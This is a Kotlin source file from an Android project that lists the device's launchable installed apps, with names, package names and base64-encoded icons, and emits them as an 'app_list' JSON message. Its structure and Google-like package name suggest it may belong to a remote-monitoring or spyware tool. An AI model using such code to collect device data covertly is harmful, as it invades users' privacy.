package com.app.googlemodz

import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Drawable
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream

object AppsRechive {
    fun listApps(ctx: Context, emit: (JSONObject) -> Unit) {
        val l = JSONArray()
        
        for (app in ctx.packageManager.getInstalledApplications(0)) {
            if (ctx.packageManager.getLaunchIntentForPackage(app.packageName) != null) {
                val o = JSONObject()
                o.put("name", ctx.packageManager.getApplicationLabel(app).toString())
                o.put("pkg", app.packageName)
                
                try {
                    o.put("icon", drawableToBase64(ctx.packageManager.getApplicationIcon(app.packageName)))
                } catch (e: Exception) {}
                
                l.put(o)
            }
        }
        
        emit(JSONObject().put("action", "app_list").put("data", l))
    }
    
    fun drawableToBase64(drawable: Drawable): String {
        val bitmap = if (drawable is BitmapDrawable) {
            drawable.bitmap
        } else {
            val bmp = Bitmap.createBitmap(drawable.intrinsicWidth, drawable.intrinsicHeight, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bmp)
            drawable.setBounds(0, 0, canvas.width, canvas.height)
            drawable.draw(canvas)
            bmp
        }
        
        val resized = Bitmap.createScaledBitmap(bitmap, 96, 96, true)
        val baos = ByteArrayOutputStream()
        resized.compress(Bitmap.CompressFormat.PNG, 100, baos)
        
        return "data:image/png;base64," + Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
    }
}
